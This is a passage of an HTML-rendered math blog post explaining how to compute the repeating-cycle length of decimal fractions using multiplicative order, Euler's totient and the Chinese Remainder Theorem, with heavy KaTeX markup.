stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_p | \phi(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>q</mi></msub><mi mathvariant="normal">∣</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_q | \phi(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>.</p><p>The order of the multiplicative group of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^k \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>, denoted as <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">n_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, is the smallest positive integer <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> such that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>. Since <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m = pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span>, according to the Chinese Remainder Theorem, if we can simultaneously satisfy <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>, then <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span> also holds.</p><p>To find <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">n_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, we need to find the smallest <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> such that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^n \equiv 1 \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>. This means <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> must be a multiple of both <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">n_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">n_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>. Therefore, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>m</mi></msub><mo>=</mo><mtext>lcm</mtext><mo stretchy="false">(</mo><msub><mi>n</mi><mi>p</mi></msub><mo separator="true">,</mo><msub><mi>n</mi><mi>q</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_m = \text{lcm}(n_p, n_q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">lcm</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>.</p><p>This leads to another question, how to quickly calculate the order of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><msup><mi>p</mi><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">10^k \mod p^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span>? We only know the order must be a factor of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>b</mi></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>p</mi><mrow><mi>b</mi><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(p^b)=p^{b-1}(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>.</p><h2 id="When-the-Denominator-and-10-are-Not-Coprime">When the Denominator and 10 are Not Coprime</h2><p>When 10 and n are not coprime, n’s factors include 2 or 5, let <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mn>2</mn><mi>a</mi></msup><mo>∗</mo><msup><mn>5</mn><mi>b</mi></msup><mo>∗</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">n=2^a*5^b*m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>, m is coprime with 10, a,b are natural numbers and not all 0. In this case,</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><msup><mn>2</mn><mi>a</mi></msup><msup><mn>5</mn><mi>b</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">10^k \mod (2^a5^b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.1491em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>When k is large enough, it must be 0. We only need to prove that <strong>multiplying a finite decimal by an infinite recurring decimal does not change the length of the recurring cycle</strong>. This needs proof, but I don’t know how.</p><p>That is, we don’t need to consider the factors of 2 or 5, just extract the factors that are coprime with 10. (I still don’t know how to prove this).</p><h2 id="Algorithm">Algorithm</h2><p>First, remove 2 and 5 completely, the value must be a combination structure like <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mi>a</mi></msup><msup><mi>q</mi><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">p^aq^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span> (some exponents can be 0), at this time <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>b</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(p^b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> is less than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">p^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal 